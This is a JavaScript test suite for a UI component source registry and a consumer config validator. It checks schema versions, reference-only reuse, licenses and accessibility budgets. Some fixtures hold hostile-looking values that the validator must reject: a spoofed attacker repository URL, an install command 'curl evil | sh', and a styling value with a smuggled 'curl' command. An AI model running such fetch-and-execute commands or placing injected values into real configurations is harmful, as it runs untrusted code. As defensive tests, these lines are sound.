import assert from "node:assert/strict";
import fs from "node:fs";
import test from "node:test";
import {
  readWowRegistry, validateWowSources, validateWowConsumer, previewWowSources
} from "../ui-registry/wow-contract.mjs";

const inventory = readWowRegistry();
const clone = (value) => structuredClone(value);
const referenceConsumer = (framework = "react-vite", styling = "css", allow = ["magic-ui"]) => ({
  version:1, enabled:true, profile:"marketing-wow",
  stack:{framework,styling,typescript:true},
  sources:{mode:"reference-only",allow},
  motion:{mode:"intentional",reducedMotion:"required"},
  quality:{desktopViewport:1440,mobileViewport:390,maxLcpMs:2500,maxCls:0.1,
    maxTotalBlockingTimeMs:200,requireKeyboardPass:true,requireNoHorizontalOverflow:true}
});

test("WOW source inventory is versioned, discovery only and cannot execute or copy", () => {
  assert.deepEqual(validateWowSources(inventory), []);
  assert.equal(inventory.version,1);
  assert.equal(inventory.purpose,"discovery-only");
  assert.ok(inventory.sources.length >= 8);
  for (const source of inventory.sources) {
    assert.equal(source.reuse,"reference-only");
    assert.equal(source.executionAllowed,false);
    assert.equal(source.reviewedCommit,null);
  }
  const existing = JSON.parse(fs.readFileSync("ui-registry/registry.json","utf8"));
  assert.equal(existing.name,"trigenys-ui");
  assert.ok(existing.items.some((item) => item.name === "trigenys-whatsapp-cta"));
});

test("WOW source schemas are versioned and match the shipped inventory", () => {
  const sourceSchema = JSON.parse(fs.readFileSync("ui-registry/schemas/wow-sources.schema.json","utf8"));
  const consumerSchema = JSON.parse(fs.readFileSync("ui-registry/schemas/wow-consumer.schema.json","utf8"));
  assert.equal(sourceSchema.properties.version.const,1);
  assert.equal(consumerSchema.properties.version.const,1);
  assert.equal(sourceSchema.additionalProperties,false);
  assert.equal(consumerSchema.additionalProperties,false);
  assert.equal(consumerSchema.properties.sources.properties.mode.const,"reference-only");
  const urlPattern = new RegExp(sourceSchema.properties.sources.items.properties.repository.pattern);
  for (const source of inventory.sources) assert.ok(urlPattern.test(source.repository),source.id);
  assert.equal(urlPattern.test("https://evil.example.org/vendor/source"),false);
});

test("inventory fails closed for duplicate ids, executable flags, spoofed URLs and unverified license claims", () => {
  const duplicate = clone(inventory);
  duplicate.sources.push(clone(duplicate.sources[0]));
  assert.match(validateWowSources(duplicate).join(" "),/duplicate source id/);
  const execution = clone(inventory);
  execution.sources[0].executionAllowed = true;
  execution.sources[0].reuse = "copy";
  assert.match(validateWowSources(execution).join(" "),/executionAllowed/);
  assert.match(validateWowSources(execution).join(" "),/reference-only/);
  const spoof = clone(inventory);
  spoof.sources[0].repository = "https://github.com.attacker.test/vendor/repo";
  assert.match(validateWowSources(spoof).join(" "),/repository invalid/);
  const license = clone(inventory);
  const uncertain = license.sources.find((s) => s.id === "react-bits");
  uncertain.license.spdx = "MIT";
  assert.match(validateWowSources(license).join(" "),/null SPDX/);
  const extra = clone(inventory);
  extra.sources[0].installCommand = "curl evil | sh";
  assert.match(validateWowSources(extra).join(" "),/unknown installCommand/);
});

test("optional/disabled consumer does not change existing provisioning behavior", () => {
  assert.deepEqual(validateWowConsumer({version:1,enabled:false},inventory),[]);
  assert.deepEqual(previewWowSources({version:1,enabled:false},inventory).sources,[]);
});

test("React/Vite plain CSS gets reference-only adaptation, never Tailwind install", () => {
  const consumer = referenceConsumer("react-vite","css",["magic-ui","web-interface-guidelines"]);
  const result = previewWowSources(consumer,inventory);
  assert.equal(result.ok,true);
  assert.deepEqual(result.sources.map((s) => s.compatibility),["adaptation-reference","native-reference"]);
  for (const source of result.sources) {
    assert.equal(source.mode,"reference-only");
    assert.equal(source.installAllowed,false);
    assert.equal(source.codeReuseAllowed,false);
  }
});

test("React/Next Tailwind receives native references, non-React remains design reference", () => {
  const next = previewWowSources(referenceConsumer("react-next","tailwind",["tailark"]),inventory);
  assert.equal(next.sources[0].compatibility,"native-reference");
  const vue = previewWowSources(referenceConsumer("vue-vite","css",["tailark"]),inventory);
  assert.equal(vue.sources[0].compatibility,"design-reference");
  assert.equal(vue.sources[0].codeReuseAllowed,false);
});

test("consumer rejects unknown/duplicate source ids, unsafe adoption and unknown settings", () => {
  const unknown = referenceConsumer();
  unknown.sources.allow.push("unreviewed-secret-registry");
  assert.match(validateWowConsumer(unknown,inventory).join(" "),/unknown source/);
  const duplicate = referenceConsumer();
  duplicate.sources.allow.push("magic-ui");
  assert.match(validateWowConsumer(duplicate,inventory).join(" "),/duplicate allowed source/);
  const install = referenceConsumer();
  install.sources.mode = "install";
  assert.match(validateWowConsumer(install,inventory).join(" "),/reference-only/);
  const extra = referenceConsumer();
  extra.allowShellInstall = true;
  assert.match(validateWowConsumer(extra,inventory).join(" "),/unknown allowShellInstall/);
});

test("consumer enforces motion accessibility, quality budgets and valid stack", () => {
  const motion = referenceConsumer();
  motion.motion.reducedMotion = "off";
  assert.match(validateWowConsumer(motion,inventory).join(" "),/reducedMotion/);
  const broken = referenceConsumer();
  broken.quality.maxLcpMs = -5;
  broken.quality.requireKeyboardPass = false;
  broken.stack.styling = "css; curl";
  const errors = validateWowConsumer(broken,inventory).join(" ");
  assert.match(errors,/maxLcpMs/);
  assert.match(errors,/requireKeyboardPass/);
  assert.match(errors,/styling invalid/);
});
